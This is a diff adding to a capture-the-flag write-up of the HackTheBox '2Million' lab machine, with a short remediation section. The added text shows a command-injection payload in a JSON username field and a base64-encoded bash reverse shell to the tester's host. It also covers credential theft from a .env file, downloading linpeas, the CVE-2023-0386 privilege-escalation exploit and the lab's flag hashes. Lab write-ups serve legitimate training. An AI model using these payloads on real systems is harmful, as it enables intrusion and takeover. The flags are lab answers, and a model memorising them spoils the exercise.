@@ -101,6 +101,8 @@ function makeInviteCode() {
 ```
 The first function seems to be similar in the regards to it verifying an invite code, 
 but the second one ( makeInviteCode() ), seems that it writes to `/api/v1/invite/how/to/generate`
+
+## Exploitation
 Lets try a post to the path.
 ```
 curl -sX POST http://2million.htb/api/v1/invite/how/to/generate     
@@ -196,4 +198,124 @@ The header is the information which was formatted by molding the error messages 
 By inputting this into our VM, we can then check our privileges by running curl onto the /admin/auth panel we discovered earlier.
 `"id": 13, "username": "TEST", "is_admin": 1`
 
+Now that we have advanced privileges, we need to establish a foothold. From our search into the /V1 folder previously, we found /admin/vpn/generate. 
+Upon attempting to post to the ip, it returns `missing parameter: username`. 
+This shows us that each vpn key is different for each user. 
+Lets run the program and see what we find.
+```
+client
+dev tun
+proto udp
+remote edge-eu-free-1.2million.htb 1337
+resolv-retry infinite
+nobind
+persist-key
+persist-tun
+remote-cert-tls server
+comp-lzo
+verb 3
+data-ciphers-fallback AES-128-CBC
+data-ciphers AES-256-CBC:AES-256-CFB:AES-256-CFB1:AES-256-CFB8:AES-256-OFB:AES-256-GCM
+tls-cipher "DEFAULT:@SECLEVEL=0"
+auth SHA256
+key-direction 1
+<ca>
+-----BEGIN CERTIFICATE-----
+MIIGADCCA+igAwIBAgIUQxzHkNyCAfHzUuoJgKZwCwVNjgIwDQYJKoZIhvcNAQEL
+BQAwgYgxCzAJBgNVBAYTAlVLMQ8wDQYDVQQIDAZMb25kb24xDzANBgNVBAcMBkxv
+<snip>
+```
+Due to this being a system script, we can try to possibly run a command through malicious code insertion into the JSON data parameter.
+```
+curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=ncppdbl1jbirhl56vosd1bl27k" --header "Content-Type: application/json" --data '{"username":"test;id;"}'
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+Perfect. This shows that we have access to run commands. Our next step should be to attempt to get a netcat listener nunning on the target. 
+I will use a basic netcat listener, `bash -i >& /dev/tcp/10.10.14.89/6789 0>&1`
+We need to encode it in base64 for it to be processed correctly. The easiest way to do this is via openssl as seen below.
+```
+openssl base64 <<< 'bash -i >& /dev/tcp/10.10.14.89/6789 0>&1'
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44OS82Nzg5IDA+JjEK                                                                                                                    
+openssl base64 -d <<< YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44OS82Nzg5IDA+JjEK 
+bash -i >& /dev/tcp/10.10.14.89/6789 0>&1
+```
+We now have our payload encoded and ready to post.
+```
+curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=ncppdbl1jbirhl56vosd1bl27k" --header "Content-Type: application/json" --data '{"username":"test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44OS82Nzg5IDA+JjEK | base64 -d | bash;"}' 
+```
+This is quite a long line. Broken down its similar to the previous explination, except that there is a command to display an encoded payload, decode and then run it.
+Upon running the command our shell shows that we have a foothold. we land in the /var/www directory, and upon running `la -la` we can see a hidden directory called `HTML`.
+There is a hidden file called `.env` which only displays when running `ls -la`, which upon inspection has leftover credentials.
+```
+www-data@2million:~/html$ cat .env
+cat .env
+DB_HOST=127.0.0.1
+DB_DATABASE=htb_prod
+DB_USERNAME=admin
+DB_PASSWORD=SuperDuperPass123
+www-data@2million:~/html$ 
+```
+We can now try these details on a fresh ssh session. 
+```
+ssh admin@2million.htb  
+admin@2million.htb's password: 
+<snip>
+admin@2million:~$ ls
+user.txt
+admin@2million:~$ cat user.txt
+e2c737105d3c783678b81e368b864f5b
+```
+This gives us the user flag we didnt have the permissions to view as previously.
+##Escalation
+Now we have privileges we need to get root. Im going to run a LinPeas scan that i downloaded from a locally hosted python server over port 8080.
+```
+python3 -m http.server 8080   
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/)
 
+admin@2million:~$ wget http://10.10.14.89:8080/linpeas.sh
+--2026-04-15 16:10:20--  http://10.10.14.89:8080/linpeas.sh
+Connecting to 10.10.14.89:8080... connected.
+
+admin@2million:~$ chmod +x linpeas.sh
+admin@2million:~$ ./linpeas.sh
+```
+Now we wait for it to run to see if theres any vunerabilities we can use to escalate.
+```
+CVE-2022-0847                  DirtyPipe                         
+CVE-2022-0995                  watch_queue
+CVE-2022-2586                  nft_object UAF
+CVE-2022-32250                 nft_object UAF (NFT_MSG_NEWSET)
+CVE-2023-0386                  OverlayFS suid smuggle
+```
+Upon reaching a dead end with dirty pipe, im going to now try the other cve, OverlayFS.
+Ill be using the highest rated one on github, xhaneikis CVE-2023-0386 exploit. 
+Link: https://github.com/xkaneiki/CVE-2023-0386
+
+By hosting my python3 server like before, i used wget to transfer the project to the target machine. 
+By following the github instructions i was then able to run the following.
+```
+admin@2million:~/CVE-2023-0386$ make all
+gcc fuse.c -o fuse -D_FILE_OFFSET_BITS=64 -static -pthread -lfuse -ldl
+<snip>
+admin@2million:~/CVE-2023-0386$ ./fuse ./ovlcap/lower ./gc &
+<snip>
+admin@2million:~/CVE-2023-0386$ ./exp
+uid:1000 gid:1000
+<snip>
+[+] exploit success!
+root@2million:~/CVE-2023-0386# whoami
+root
+root@2million:/root# cat root.txt
+8b6df6d0c12c96284cbc8a604dd4c235
+```
+And thats it! That was my enumeration and exploitation of the "2MILLION" box from htb labs.
+##Remidation 
+Some important factors to fix immediately are the ability to post the admin configuration settings as an unpriviledged user. 
+This will prevent the same attack from being replicated by bad actors. Other paths also need to be tweaking,
+Such as being able to verify permissions via is_admin variable. These all stem from a lack of input sanitisation.
+
+Another main factor used to exploit this machine was the ability to interact with the uservpn functions,
+allowing us to pass commands through to a server which is how we established a netcat listener.
+This was done by this oversight in the script:
+`$output = shell_exec("/usr/bin/cat /var/www/html/VPN/user/$username.ovpn");`
+This shows that by parsing a username as a script, such as a tcp shell, we can gain access.
